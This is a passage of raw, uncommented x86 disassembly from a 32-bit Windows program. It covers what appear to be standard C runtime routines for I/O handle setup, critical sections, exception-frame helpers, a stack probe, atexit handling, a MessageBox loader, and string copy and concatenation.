  4235d2:	test   eax,eax
  4235d4:	je     0x4236b7
  4235da:	mov    edi,DWORD PTR [eax]
  4235dc:	lea    ebp,[eax+0x4]
  4235df:	lea    eax,[edi+ebp*1]
  4235e2:	mov    DWORD PTR [esp+0x10],eax
  4235e6:	mov    eax,0x800
  4235eb:	cmp    edi,eax
  4235ed:	jl     0x4235f1
  4235ef:	mov    edi,eax
  4235f1:	cmp    DWORD PTR ds:0x4653e8,edi
  4235f7:	jge    0x423647
  4235f9:	mov    esi,0x465404
  4235fe:	push   ebx
  4235ff:	call   0x424672
  423604:	test   eax,eax
  423606:	pop    ecx
  423607:	je     0x423641
  423609:	add    DWORD PTR ds:0x4653e8,0x20
  423610:	mov    DWORD PTR [esi],eax
  423612:	lea    ecx,[eax+0x480]
  423618:	jmp    0x423630
  42361a:	and    BYTE PTR [eax+0x4],0x0
  42361e:	or     DWORD PTR [eax],0xffffffff
  423621:	and    DWORD PTR [eax+0x8],0x0
  423625:	mov    BYTE PTR [eax+0x5],0xa
  423629:	mov    ecx,DWORD PTR [esi]
  42362b:	add    eax,0x24
  42362e:	add    ecx,ebx
  423630:	cmp    eax,ecx
  423632:	jb     0x42361a
  423634:	add    esi,0x4
  423637:	cmp    DWORD PTR ds:0x4653e8,edi
  42363d:	jl     0x4235fe
  42363f:	jmp    0x423647
  423641:	mov    edi,DWORD PTR ds:0x4653e8
  423647:	xor    ebx,ebx
  423649:	test   edi,edi
  42364b:	jle    0x4236b7
  42364d:	mov    eax,DWORD PTR [esp+0x10]
  423651:	mov    eax,DWORD PTR [eax]
  423653:	cmp    eax,0xffffffff
  423656:	je     0x4236ac
  423658:	mov    cl,BYTE PTR [ebp+0x0]
  42365b:	test   cl,0x1
  42365e:	je     0x4236ac
  423660:	test   cl,0x8
  423663:	jne    0x423670
  423665:	push   eax
  423666:	call   DWORD PTR ds:0x42809c
  42366c:	test   eax,eax
  42366e:	je     0x4236ac
  423670:	mov    ecx,ebx
  423672:	mov    eax,ebx
  423674:	and    eax,0x1f
  423677:	lea    eax,[eax+eax*8]
  42367a:	sar    ecx,0x5
  42367d:	mov    ecx,DWORD PTR [ecx*4+0x465400]
  423684:	lea    esi,[ecx+eax*4]
  423687:	mov    eax,DWORD PTR [esp+0x10]
  42368b:	mov    eax,DWORD PTR [eax]
  42368d:	mov    DWORD PTR [esi],eax
  42368f:	mov    al,BYTE PTR [ebp+0x0]
  423692:	mov    BYTE PTR [esi+0x4],al
  423695:	lea    eax,[esi+0xc]
  423698:	push   0xfa0
  42369d:	push   eax
  42369e:	call   0x4249dd
  4236a3:	test   eax,eax
  4236a5:	pop    ecx
  4236a6:	pop    ecx
  4236a7:	je     0x4236d7
  4236a9:	inc    DWORD PTR [esi+0x8]
  4236ac:	add    DWORD PTR [esp+0x10],0x4
  4236b1:	inc    ebx
  4236b2:	inc    ebp
  4236b3:	cmp    ebx,edi
  4236b5:	jl     0x42364d
  4236b7:	xor    ebx,ebx
  4236b9:	mov    ecx,DWORD PTR ds:0x465400
  4236bf:	lea    eax,[ebx+ebx*8]
  4236c2:	lea    esi,[ecx+eax*4]
  4236c5:	cmp    DWORD PTR [esi],0xffffffff
  4236c8:	jne    0x423739
  4236ca:	test   ebx,ebx
  4236cc:	mov    BYTE PTR [esi+0x4],0x81
  4236d0:	jne    0x4236dc
  4236d2:	push   0xfffffff6
  4236d4:	pop    eax
  4236d5:	jmp    0x4236e6
  4236d7:	or     eax,0xffffffff
  4236da:	jmp    0x423755
  4236dc:	mov    eax,ebx
  4236de:	dec    eax
  4236df:	neg    eax
  4236e1:	sbb    eax,eax
  4236e3:	add    eax,0xfffffff5
  4236e6:	push   eax
  4236e7:	call   DWORD PTR ds:0x42807c
  4236ed:	mov    edi,eax
  4236ef:	cmp    edi,0xffffffff
  4236f2:	je     0x423733
  4236f4:	push   edi
  4236f5:	call   DWORD PTR ds:0x42809c
  4236fb:	test   eax,eax
  4236fd:	je     0x423733
  4236ff:	and    eax,0xff
  423704:	cmp    eax,0x2
  423707:	mov    DWORD PTR [esi],edi
  423709:	jne    0x423711
  42370b:	or     BYTE PTR [esi+0x4],0x40
  42370f:	jmp    0x42371a
  423711:	cmp    eax,0x3
  423714:	jne    0x42371a
  423716:	or     BYTE PTR [esi+0x4],0x8
  42371a:	lea    eax,[esi+0xc]
  42371d:	push   0xfa0
  423722:	push   eax
  423723:	call   0x4249dd
  423728:	test   eax,eax
  42372a:	pop    ecx
  42372b:	pop    ecx
  42372c:	je     0x4236d7
  42372e:	inc    DWORD PTR [esi+0x8]
  423731:	jmp    0x42373d
  423733:	or     BYTE PTR [esi+0x4],0x40
  423737:	jmp    0x42373d
  423739:	or     BYTE PTR [esi+0x4],0x80
  42373d:	inc    ebx
  42373e:	cmp    ebx,0x3
  423741:	jl     0x4236b9
  423747:	push   DWORD PTR ds:0x4653e8
  42374d:	call   DWORD PTR ds:0x428098
  423753:	xor    eax,eax
  423755:	pop    edi
  423756:	pop    esi
  423757:	pop    ebp
  423758:	pop    ebx
  423759:	add    esp,0x48
  42375c:	ret    
  42375d:	push   0xc
  42375f:	push   0x4284f8
  423764:	call   0x423950
  423769:	mov    DWORD PTR [ebp-0x1c],0x428f50
  423770:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  423777:	jae    0x42379b
  423779:	and    DWORD PTR [ebp-0x4],0x0
  42377d:	mov    eax,DWORD PTR [ebp-0x1c]
  423780:	mov    eax,DWORD PTR [eax]
  423782:	test   eax,eax
  423784:	je     0x423791
  423786:	call   eax
  423788:	jmp    0x423791
  42378a:	xor    eax,eax
  42378c:	inc    eax
  42378d:	ret    
  42378e:	mov    esp,DWORD PTR [ebp-0x18]
  423791:	or     DWORD PTR [ebp-0x4],0xffffffff
  423795:	add    DWORD PTR [ebp-0x1c],0x4
  423799:	jmp    0x423770
  42379b:	call   0x42398b
  4237a0:	ret    
  4237a1:	push   0xc
  4237a3:	push   0x428508
  4237a8:	call   0x423950
  4237ad:	mov    DWORD PTR [ebp-0x1c],0x428f58
  4237b4:	cmp    DWORD PTR [ebp-0x1c],0x428f58
  4237bb:	jae    0x4237df
  4237bd:	and    DWORD PTR [ebp-0x4],0x0
  4237c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237c4:	mov    eax,DWORD PTR [eax]
  4237c6:	test   eax,eax
  4237c8:	je     0x4237d5
  4237ca:	call   eax
  4237cc:	jmp    0x4237d5
  4237ce:	xor    eax,eax
  4237d0:	inc    eax
  4237d1:	ret    
  4237d2:	mov    esp,DWORD PTR [ebp-0x18]
  4237d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237d9:	add    DWORD PTR [ebp-0x1c],0x4
  4237dd:	jmp    0x4237b4
  4237df:	call   0x42398b
  4237e4:	ret    
  4237e5:	call   0x423a26
  4237ea:	mov    eax,ds:0x464594
  4237ef:	cmp    eax,0xffffffff
  4237f2:	je     0x423802
  4237f4:	push   eax
  4237f5:	call   DWORD PTR ds:0x4280a4
  4237fb:	or     DWORD PTR ds:0x464594,0xffffffff
  423802:	ret    
  423803:	push   ebx
  423804:	push   esi
  423805:	call   DWORD PTR ds:0x428034
  42380b:	push   DWORD PTR ds:0x464594
  423811:	mov    ebx,eax
  423813:	call   DWORD PTR ds:0x4280b4
  423819:	mov    esi,eax
  42381b:	test   esi,esi
  42381d:	jne    0x423868
  42381f:	push   0x88
  423824:	push   0x1
  423826:	call   0x424a68
  42382b:	mov    esi,eax
  42382d:	test   esi,esi
  42382f:	pop    ecx
  423830:	pop    ecx
  423831:	je     0x423860
  423833:	push   esi
  423834:	push   DWORD PTR ds:0x464594
  42383a:	call   DWORD PTR ds:0x4280b0
  423840:	test   eax,eax
  423842:	je     0x423860
  423844:	mov    DWORD PTR [esi+0x54],0x4644e8
  42384b:	mov    DWORD PTR [esi+0x14],0x1
  423852:	call   DWORD PTR ds:0x4280ac
  423858:	or     DWORD PTR [esi+0x4],0xffffffff
  42385c:	mov    DWORD PTR [esi],eax
  42385e:	jmp    0x423868
  423860:	push   0x10
  423862:	call   0x422a16
  423867:	pop    ecx
  423868:	push   ebx
  423869:	call   DWORD PTR ds:0x4280a8
  42386f:	mov    eax,esi
  423871:	pop    esi
  423872:	pop    ebx
  423873:	ret    
  423874:	call   0x4239dd
  423879:	test   eax,eax
  42387b:	je     0x42388d
  42387d:	call   DWORD PTR ds:0x4280b8
  423883:	cmp    eax,0xffffffff
  423886:	mov    ds:0x464594,eax
  42388b:	jne    0x423895
  42388d:	call   0x4237e5
  423892:	xor    eax,eax
  423894:	ret    
  423895:	push   esi
  423896:	push   0x88
  42389b:	push   0x1
  42389d:	call   0x424a68
  4238a2:	mov    esi,eax
  4238a4:	test   esi,esi
  4238a6:	pop    ecx
  4238a7:	pop    ecx
  4238a8:	je     0x4238da
  4238aa:	push   esi
  4238ab:	push   DWORD PTR ds:0x464594
  4238b1:	call   DWORD PTR ds:0x4280b0
  4238b7:	test   eax,eax
  4238b9:	je     0x4238da
  4238bb:	mov    DWORD PTR [esi+0x54],0x4644e8
  4238c2:	mov    DWORD PTR [esi+0x14],0x1
  4238c9:	call   DWORD PTR ds:0x4280ac
  4238cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238d3:	mov    DWORD PTR [esi],eax
  4238d5:	xor    eax,eax
  4238d7:	inc    eax
  4238d8:	pop    esi
  4238d9:	ret    
  4238da:	call   0x4237e5
  4238df:	xor    eax,eax
  4238e1:	pop    esi
  4238e2:	ret    
  4238e3:	cmp    DWORD PTR ds:0x464d64,0x2
  4238ea:	jne    0x4238f9
  4238ec:	cmp    DWORD PTR ds:0x464d70,0x5
  4238f3:	jb     0x4238f9
  4238f5:	xor    eax,eax
  4238f7:	inc    eax
  4238f8:	ret    
  4238f9:	push   0x3
  4238fb:	pop    eax
  4238fc:	ret    
  4238fd:	xor    eax,eax
  4238ff:	cmp    DWORD PTR [esp+0x4],eax
  423903:	push   0x0
  423905:	sete   al
  423908:	push   0x1000
  42390d:	push   eax
  42390e:	call   DWORD PTR ds:0x4280c0
  423914:	test   eax,eax
  423916:	mov    ds:0x4653e0,eax
  42391b:	je     0x423947
  42391d:	call   0x4238e3
  423922:	cmp    eax,0x3
  423925:	mov    ds:0x4653e4,eax
  42392a:	jne    0x42394a
  42392c:	push   0x3f8
  423931:	call   0x424cea
  423936:	test   eax,eax
  423938:	pop    ecx
  423939:	jne    0x42394a
  42393b:	push   DWORD PTR ds:0x4653e0
  423941:	call   DWORD PTR ds:0x4280bc
  423947:	xor    eax,eax
  423949:	ret    
  42394a:	xor    eax,eax
  42394c:	inc    eax
  42394d:	ret    
  42394e:	int3   
  42394f:	int3   
  423950:	push   0x425818
  423955:	mov    eax,fs:0x0
  42395b:	push   eax
  42395c:	mov    eax,DWORD PTR [esp+0x10]
  423960:	mov    DWORD PTR [esp+0x10],ebp
  423964:	lea    ebp,[esp+0x10]
  423968:	sub    esp,eax
  42396a:	push   ebx
  42396b:	push   esi
  42396c:	push   edi
  42396d:	mov    eax,DWORD PTR [ebp-0x8]
  423970:	mov    DWORD PTR [ebp-0x18],esp
  423973:	push   eax
  423974:	mov    eax,DWORD PTR [ebp-0x4]
  423977:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42397e:	mov    DWORD PTR [ebp-0x8],eax
  423981:	lea    eax,[ebp-0x10]
  423984:	mov    fs:0x0,eax
  42398a:	ret    
  42398b:	mov    ecx,DWORD PTR [ebp-0x10]
  42398e:	mov    DWORD PTR fs:0x0,ecx
  423995:	pop    ecx
  423996:	pop    edi
  423997:	pop    esi
  423998:	pop    ebx
  423999:	leave  
  42399a:	push   ecx
  42399b:	ret    
  42399c:	int3   
  42399d:	int3   
  42399e:	int3   
  42399f:	int3   
  4239a0:	cmp    eax,0x1000
  4239a5:	jae    0x4239b5
  4239a7:	neg    eax
  4239a9:	add    eax,esp
  4239ab:	add    eax,0x4
  4239ae:	test   DWORD PTR [eax],eax
  4239b0:	xchg   esp,eax
  4239b1:	mov    eax,DWORD PTR [eax]
  4239b3:	push   eax
  4239b4:	ret    
  4239b5:	push   ecx
  4239b6:	lea    ecx,[esp+0x8]
  4239ba:	sub    ecx,0x1000
  4239c0:	sub    eax,0x1000
  4239c5:	test   DWORD PTR [ecx],eax
  4239c7:	cmp    eax,0x1000
  4239cc:	jae    0x4239ba
  4239ce:	sub    ecx,eax
  4239d0:	mov    eax,esp
  4239d2:	test   DWORD PTR [ecx],eax
  4239d4:	mov    esp,ecx
  4239d6:	mov    ecx,DWORD PTR [eax]
  4239d8:	mov    eax,DWORD PTR [eax+0x4]
  4239db:	push   eax
  4239dc:	ret    
  4239dd:	push   esi
  4239de:	push   edi
  4239df:	xor    esi,esi
  4239e1:	mov    edi,0x464ec0
  4239e6:	cmp    DWORD PTR [esi*8+0x4645a4],0x1
  4239ee:	jne    0x423a0e
  4239f0:	lea    eax,[esi*8+0x4645a0]
  4239f7:	mov    DWORD PTR [eax],edi
  4239f9:	push   0xfa0
  4239fe:	push   DWORD PTR [eax]
  423a00:	add    edi,0x18
  423a03:	call   0x4249dd
  423a08:	test   eax,eax
  423a0a:	pop    ecx
  423a0b:	pop    ecx
  423a0c:	je     0x423a1a
  423a0e:	inc    esi
  423a0f:	cmp    esi,0x24
  423a12:	jl     0x4239e6
  423a14:	xor    eax,eax
  423a16:	inc    eax
  423a17:	pop    edi
  423a18:	pop    esi
  423a19:	ret    
  423a1a:	and    DWORD PTR [esi*8+0x4645a0],0x0
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a17
  423a26:	push   ebx
  423a27:	mov    ebx,DWORD PTR ds:0x4280a0
  423a2d:	push   esi
  423a2e:	mov    esi,0x4645a0
  423a33:	push   edi
  423a34:	mov    edi,DWORD PTR [esi]
  423a36:	test   edi,edi
  423a38:	je     0x423a4d
  423a3a:	cmp    DWORD PTR [esi+0x4],0x1
  423a3e:	je     0x423a4d
  423a40:	push   edi
  423a41:	call   ebx
  423a43:	push   edi
  423a44:	call   0x42455a
  423a49:	and    DWORD PTR [esi],0x0
  423a4c:	pop    ecx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x4646c0
  423a56:	jl     0x423a34
  423a58:	mov    esi,0x4645a0
  423a5d:	pop    edi
  423a5e:	mov    eax,DWORD PTR [esi]
  423a60:	test   eax,eax
  423a62:	je     0x423a6d
  423a64:	cmp    DWORD PTR [esi+0x4],0x1
  423a68:	jne    0x423a6d
  423a6a:	push   eax
  423a6b:	call   ebx
  423a6d:	add    esi,0x8
  423a70:	cmp    esi,0x4646c0
  423a76:	jl     0x423a5e
  423a78:	pop    esi
  423a79:	pop    ebx
  423a7a:	ret    
  423a7b:	push   ebp
  423a7c:	mov    ebp,esp
  423a7e:	mov    eax,DWORD PTR [ebp+0x8]
  423a81:	push   DWORD PTR [eax*8+0x4645a0]
  423a88:	call   DWORD PTR ds:0x4280cc
  423a8e:	pop    ebp
  423a8f:	ret    
  423a90:	push   ebp
  423a91:	mov    ebp,esp
  423a93:	push   esi
  423a94:	mov    esi,DWORD PTR [ebp+0x8]
  423a97:	lea    esi,[esi*8+0x4645a0]
  423a9e:	cmp    DWORD PTR [esi],0x0
  423aa1:	je     0x423aa8
  423aa3:	xor    eax,eax
  423aa5:	inc    eax
  423aa6:	jmp    0x423b0c
  423aa8:	push   edi
  423aa9:	push   0x18
  423aab:	call   0x424672
  423ab0:	mov    edi,eax
  423ab2:	test   edi,edi
  423ab4:	pop    ecx
  423ab5:	jne    0x423ac6
  423ab7:	call   0x4258f0
  423abc:	mov    DWORD PTR [eax],0xc
  423ac2:	xor    eax,eax
  423ac4:	jmp    0x423b0b
  423ac6:	push   0xa
  423ac8:	call   0x423b0f
  423acd:	cmp    DWORD PTR [esi],0x0
  423ad0:	pop    ecx
  423ad1:	jne    0x423af9
  423ad3:	push   0xfa0
  423ad8:	push   edi
  423ad9:	call   0x4249dd
  423ade:	test   eax,eax
  423ae0:	pop    ecx
  423ae1:	pop    ecx
  423ae2:	jne    0x423af5
  423ae4:	push   edi
  423ae5:	call   0x42455a
  423aea:	push   0xa
  423aec:	call   0x423a7b
  423af1:	pop    ecx
  423af2:	pop    ecx
  423af3:	jmp    0x423ab7
  423af5:	mov    DWORD PTR [esi],edi
  423af7:	jmp    0x423b00
  423af9:	push   edi
  423afa:	call   0x42455a
  423aff:	pop    ecx
  423b00:	push   0xa
  423b02:	call   0x423a7b
  423b07:	xor    eax,eax
  423b09:	pop    ecx
  423b0a:	inc    eax
  423b0b:	pop    edi
  423b0c:	pop    esi
  423b0d:	pop    ebp
  423b0e:	ret    
  423b0f:	push   ebp
  423b10:	mov    ebp,esp
  423b12:	mov    eax,DWORD PTR [ebp+0x8]
  423b15:	push   esi
  423b16:	lea    esi,[eax*8+0x4645a0]
  423b1d:	cmp    DWORD PTR [esi],0x0
  423b20:	jne    0x423b35
  423b22:	push   eax
  423b23:	call   0x423a90
  423b28:	test   eax,eax
  423b2a:	pop    ecx
  423b2b:	jne    0x423b35
  423b2d:	push   0x11
  423b2f:	call   0x422a16
  423b34:	pop    ecx
  423b35:	push   DWORD PTR [esi]
  423b37:	call   DWORD PTR ds:0x4280d0
  423b3d:	pop    esi
  423b3e:	pop    ebp
  423b3f:	ret    
  423b40:	push   esi
  423b41:	push   DWORD PTR ds:0x465508
  423b47:	call   0x425aa6
  423b4c:	pop    ecx
  423b4d:	mov    ecx,DWORD PTR ds:0x465504
  423b53:	mov    esi,eax
  423b55:	mov    eax,ds:0x465508
  423b5a:	mov    edx,ecx
  423b5c:	sub    edx,eax
  423b5e:	add    edx,0x4
  423b61:	cmp    esi,edx
  423b63:	jae    0x423bb3
  423b65:	mov    ecx,0x800
  423b6a:	cmp    esi,ecx
  423b6c:	jae    0x423b70
  423b6e:	mov    ecx,esi
  423b70:	add    ecx,esi
  423b72:	push   ecx
  423b73:	push   eax
  423b74:	call   0x4258f9
  423b79:	test   eax,eax
  423b7b:	pop    ecx
  423b7c:	pop    ecx
  423b7d:	jne    0x423b96
  423b7f:	add    esi,0x10
  423b82:	push   esi
  423b83:	push   DWORD PTR ds:0x465508
  423b89:	call   0x4258f9
  423b8e:	test   eax,eax
  423b90:	pop    ecx
  423b91:	pop    ecx
  423b92:	jne    0x423b96
  423b94:	pop    esi
  423b95:	ret    
  423b96:	mov    ecx,DWORD PTR ds:0x465504
  423b9c:	sub    ecx,DWORD PTR ds:0x465508
  423ba2:	mov    ds:0x465508,eax
  423ba7:	sar    ecx,0x2
  423baa:	lea    ecx,[eax+ecx*4]
  423bad:	mov    DWORD PTR ds:0x465504,ecx
  423bb3:	mov    DWORD PTR [ecx],edi
  423bb5:	add    DWORD PTR ds:0x465504,0x4
  423bbc:	mov    eax,edi
  423bbe:	pop    esi
  423bbf:	ret    
  423bc0:	push   0x80
  423bc5:	call   0x424672
  423bca:	test   eax,eax
  423bcc:	pop    ecx
  423bcd:	mov    ds:0x465508,eax
  423bd2:	jne    0x423bd8
  423bd4:	push   0x18
  423bd6:	pop    eax
  423bd7:	ret    
  423bd8:	and    DWORD PTR [eax],0x0
  423bdb:	mov    eax,ds:0x465508
  423be0:	mov    ds:0x465504,eax
  423be5:	xor    eax,eax
  423be7:	ret    
  423be8:	push   0xc
  423bea:	push   0x428518
  423bef:	call   0x423950
  423bf4:	call   0x422c61
  423bf9:	and    DWORD PTR [ebp-0x4],0x0
  423bfd:	mov    edi,DWORD PTR [ebp+0x8]
  423c00:	call   0x423b40
  423c05:	mov    DWORD PTR [ebp-0x1c],eax
  423c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  423c0c:	call   0x423c1a
  423c11:	mov    eax,DWORD PTR [ebp-0x1c]
  423c14:	call   0x42398b
  423c19:	ret    
  423c1a:	call   0x422c6a
  423c1f:	ret    
  423c20:	push   DWORD PTR [esp+0x4]
  423c24:	call   0x423be8
  423c29:	neg    eax
  423c2b:	sbb    eax,eax
  423c2d:	neg    eax
  423c2f:	pop    ecx
  423c30:	dec    eax
  423c31:	ret    
  423c32:	push   ebp
  423c33:	mov    ebp,esp
  423c35:	sub    esp,0x10
  423c38:	push   ebx
  423c39:	xor    ebx,ebx
  423c3b:	cmp    DWORD PTR ds:0x465010,ebx
  423c41:	push   esi
  423c42:	push   edi
  423c43:	jne    0x423cb2
  423c45:	push   0x428588
  423c4a:	call   DWORD PTR ds:0x4280d4
  423c50:	mov    edi,eax
  423c52:	cmp    edi,ebx
  423c54:	je     0x423ced
  423c5a:	mov    esi,DWORD PTR ds:0x42804c
  423c60:	push   0x42857c
  423c65:	push   edi
  423c66:	call   esi
  423c68:	test   eax,eax
  423c6a:	mov    ds:0x465010,eax
  423c6f:	je     0x423ced
  423c71:	push   0x42856c
  423c76:	push   edi
  423c77:	call   esi
  423c79:	push   0x428558
  423c7e:	push   edi
  423c7f:	mov    ds:0x465014,eax
  423c84:	call   esi
  423c86:	cmp    DWORD PTR ds:0x464d64,0x2
  423c8d:	mov    ds:0x465018,eax
  423c92:	jne    0x423cb2
  423c94:	push   0x42853c
  423c99:	push   edi
  423c9a:	call   esi
  423c9c:	test   eax,eax
  423c9e:	mov    ds:0x465020,eax
  423ca3:	je     0x423cb2
  423ca5:	push   0x428524
  423caa:	push   edi
  423cab:	call   esi
  423cad:	mov    ds:0x46501c,eax
  423cb2:	mov    eax,ds:0x46501c
  423cb7:	test   eax,eax
  423cb9:	je     0x423cf7
  423cbb:	call   eax
  423cbd:	test   eax,eax
  423cbf:	je     0x423cde
  423cc1:	lea    ecx,[ebp-0x4]
  423cc4:	push   ecx
  423cc5:	push   0xc
  423cc7:	lea    ecx,[ebp-0x10]
  423cca:	push   ecx
  423ccb:	push   0x1
  423ccd:	push   eax
  423cce:	call   DWORD PTR ds:0x465020
  423cd4:	test   eax,eax
  423cd6:	je     0x423cde
  423cd8:	test   BYTE PTR [ebp-0x8],0x1
  423cdc:	jne    0x423cf7
  423cde:	cmp    DWORD PTR ds:0x464d70,0x4
  423ce5:	jb     0x423cf1
  423ce7:	or     BYTE PTR [ebp+0x12],0x20
  423ceb:	jmp    0x423d16
  423ced:	xor    eax,eax
  423cef:	jmp    0x423d26
  423cf1:	or     BYTE PTR [ebp+0x12],0x4
  423cf5:	jmp    0x423d16
  423cf7:	mov    eax,ds:0x465014
  423cfc:	test   eax,eax
  423cfe:	je     0x423d16
  423d00:	call   eax
  423d02:	mov    ebx,eax
  423d04:	test   ebx,ebx
  423d06:	je     0x423d16
  423d08:	mov    eax,ds:0x465018
  423d0d:	test   eax,eax
  423d0f:	je     0x423d16
  423d11:	push   ebx
  423d12:	call   eax
  423d14:	mov    ebx,eax
  423d16:	push   DWORD PTR [ebp+0x10]
  423d19:	push   DWORD PTR [ebp+0xc]
  423d1c:	push   DWORD PTR [ebp+0x8]
  423d1f:	push   ebx
  423d20:	call   DWORD PTR ds:0x465010
  423d26:	pop    edi
  423d27:	pop    esi
  423d28:	pop    ebx
  423d29:	leave  
  423d2a:	ret    
  423d2b:	int3   
  423d2c:	int3   
  423d2d:	int3   
  423d2e:	int3   
  423d2f:	int3   
  423d30:	push   edi
  423d31:	mov    edi,DWORD PTR [esp+0x8]
  423d35:	jmp    0x423da5
  423d37:	lea    esp,[esp+0x0]
  423d3e:	mov    edi,edi
  423d40:	mov    ecx,DWORD PTR [esp+0x4]
  423d44:	push   edi
  423d45:	test   ecx,0x3
  423d4b:	je     0x423d60
  423d4d:	mov    al,BYTE PTR [ecx]
  423d4f:	add    ecx,0x1
  423d52:	test   al,al
  423d54:	je     0x423d93
  423d56:	test   ecx,0x3
  423d5c:	jne    0x423d4d
  423d5e:	mov    edi,edi
  423d60:	mov    eax,DWORD PTR [ecx]
  423d62:	mov    edx,0x7efefeff
  423d67:	add    edx,eax
  423d69:	xor    eax,0xffffffff
  423d6c:	xor    eax,edx
  423d6e:	add    ecx,0x4
  423d71:	test   eax,0x81010100
  423d76:	je     0x423d60
  423d78:	mov    eax,DWORD PTR [ecx-0x4]
  423d7b:	test   al,al
  423d7d:	je     0x423da2
  423d7f:	test   ah,ah
  423d81:	je     0x423d9d
  423d83:	test   eax,0xff0000
  423d88:	je     0x423d98
  423d8a:	test   eax,0xff000000
  423d8f:	je     0x423d93
  423d91:	jmp    0x423d60
  423d93:	lea    edi,[ecx-0x1]
  423d96:	jmp    0x423da5
  423d98:	lea    edi,[ecx-0x2]
  423d9b:	jmp    0x423da5
  423d9d:	lea    edi,[ecx-0x3]
  423da0:	jmp    0x423da5
  423da2:	lea    edi,[ecx-0x4]
  423da5:	mov    ecx,DWORD PTR [esp+0xc]
  423da9:	test   ecx,0x3
  423daf:	je     0x423dce
  423db1:	mov    dl,BYTE PTR [ecx]
  423db3:	add    ecx,0x1
  423db6:	test   dl,dl
  423db8:	je     0x423e20
  423dba:	mov    BYTE PTR [edi],dl
  423dbc:	add    edi,0x1
  423dbf:	test   ecx,0x3
  423dc5:	jne    0x423db1
  423dc7:	jmp    0x423dce
  423dc9:	mov    DWORD PTR [edi],edx
  423dcb:	add    edi,0x4
  423dce:	mov    edx,0x7efefeff
  423dd3:	mov    eax,DWORD PTR [ecx]
  423dd5:	add    edx,eax
  423dd7:	xor    eax,0xffffffff
  423dda:	xor    eax,edx
  423ddc:	mov    edx,DWORD PTR [ecx]
  423dde:	add    ecx,0x4
  423de1:	test   eax,0x81010100
  423de6:	je     0x423dc9
  423de8:	test   dl,dl
  423dea:	je     0x423e20
  423dec:	test   dh,dh
  423dee:	je     0x423e17
  423df0:	test   edx,0xff0000
  423df6:	je     0x423e0a
  423df8:	test   edx,0xff000000
  423dfe:	je     0x423e02
  423e00:	jmp    0x423dc9
  423e02:	mov    DWORD PTR [edi],edx
  423e04:	mov    eax,DWORD PTR [esp+0x8]
  423e08:	pop    edi
  423e09:	ret    
  423e0a:	mov    WORD PTR [edi],dx
  423e0d:	mov    eax,DWORD PTR [esp+0x8]
  423e11:	mov    BYTE PTR [edi+0x2],0x0
  423e15:	pop    edi
  423e16:	ret    
  423e17:	mov    WORD PTR [edi],dx
  423e1a:	mov    eax,DWORD PTR [esp+0x8]
  423e1e:	pop    edi
  423e1f:	ret    
  423e20:	mov    BYTE PTR [edi],dl
  423e22:	mov    eax,DWORD PTR [esp+0x8]
  423e26:	pop    edi
  423e27:	ret    
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	mov    ecx,DWORD PTR [esp+0xc]
  423e34:	push   edi
  423e35:	test   ecx,ecx
  423e37:	je     0x423ecf
  423e3d:	push   esi
  423e3e:	push   ebx
  423e3f:	mov    ebx,ecx
  423e41:	mov    esi,DWORD PTR [esp+0x14]
  423e45:	test   esi,0x3
  423e4b:	mov    edi,DWORD PTR [esp+0x10]
  423e4f:	jne    0x423e5c
  423e51:	shr    ecx,0x2
  423e54:	jne    0x423edf
  423e5a:	jmp    0x423e83
  423e5c:	mov    al,BYTE PTR [esi]
  423e5e:	add    esi,0x1
  423e61:	mov    BYTE PTR [edi],al
  423e63:	add    edi,0x1
  423e66:	sub    ecx,0x1
  423e69:	je     0x423e96
  423e6b:	test   al,al
  423e6d:	je     0x423e9e
  423e6f:	test   esi,0x3
  423e75:	jne    0x423e5c
  423e77:	mov    ebx,ecx
  423e79:	shr    ecx,0x2
  423e7c:	jne    0x423edf
  423e7e:	and    ebx,0x3
  423e81:	je     0x423e96
  423e83:	mov    al,BYTE PTR [esi]
  423e85:	add    esi,0x1
  423e88:	mov    BYTE PTR [edi],al
  423e8a:	add    edi,0x1
  423e8d:	test   al,al
  423e8f:	je     0x423ec8
  423e91:	sub    ebx,0x1
  423e94:	jne    0x423e83
  423e96:	mov    eax,DWORD PTR [esp+0x10]
  423e9a:	pop    ebx
  423e9b:	pop    esi
  423e9c:	pop    edi
  423e9d:	ret    
  423e9e:	test   edi,0x3
  423ea4:	je     0x423ebc
  423ea6:	mov    BYTE PTR [edi],al
  423ea8:	add    edi,0x1
  423eab:	sub    ecx,0x1
  423eae:	je     0x423f4c
  423eb4:	test   edi,0x3
  423eba:	jne    0x423ea6
  423ebc:	mov    ebx,ecx
  423ebe:	shr    ecx,0x2
  423ec1:	jne    0x423f37
  423ec3:	mov    BYTE PTR [edi],al
  423ec5:	add    edi,0x1
  423ec8:	sub    ebx,0x1
  423ecb:	jne    0x423ec3
  423ecd:	pop    ebx
  423ece:	pop    esi
  423ecf:	mov    eax,DWORD PTR [esp+0x8]
  423ed3:	pop    edi
  423ed4:	ret    
  423ed5:	mov    DWORD PTR [edi],edx
  423ed7:	add    edi,0x4
  423eda:	sub    ecx,0x1
  423edd:	je     0x423e7e
  423edf:	mov    edx,0x7efefeff
  423ee4:	mov    eax,DWORD PTR [esi]
  423ee6:	add    edx,eax
  423ee8:	xor    eax,0xffffffff
  423eeb:	xor    eax,edx
  423eed:	mov    edx,DWORD PTR [esi]
  423eef:	add    esi,0x4
  423ef2:	test   eax,0x81010100
  423ef7:	je     0x423ed5
  423ef9:	test   dl,dl
  423efb:	je     0x423f29
  423efd:	test   dh,dh
  423eff:	je     0x423f1f
  423f01:	test   edx,0xff0000
  423f07:	je     0x423f15
  423f09:	test   edx,0xff000000
  423f0f:	jne    0x423ed5
  423f11:	mov    DWORD PTR [edi],edx
  423f13:	jmp    0x423f2d
  423f15:	and    edx,0xffff
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	jmp    0x423f2d
  423f1f:	and    edx,0xff
  423f25:	mov    DWORD PTR [edi],edx
  423f27:	jmp    0x423f2d
  423f29:	xor    edx,edx
  423f2b:	mov    DWORD PTR [edi],edx
  423f2d:	add    edi,0x4
  423f30:	xor    eax,eax
  423f32:	sub    ecx,0x1
  423f35:	je     0x423f43
